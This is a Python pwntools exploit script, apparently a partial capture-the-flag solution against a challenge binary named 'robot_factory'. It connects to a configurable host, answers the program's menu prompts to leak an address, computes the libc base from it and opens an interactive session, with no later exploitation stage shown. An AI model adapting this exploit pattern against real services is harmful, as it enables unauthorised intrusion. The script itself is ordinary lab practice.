#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./robot_factory')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 2121)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

libc=ELF("libc.so.6")
io = start()

sla(b"What kind of robot would you like? (n/s) > ", b"n")
sla(b"What kind of operation do you want? (a/s/m) > ", b"a")
sla(b"Enter number 1: ", b"A")
sla(b"Enter number 2: ", b"A")
reu(b"Result: ")
libc.address = int(rl().strip(b"\n"))+0x826138
success(f"libc base : {hex(libc.address)}")

io.interactive()
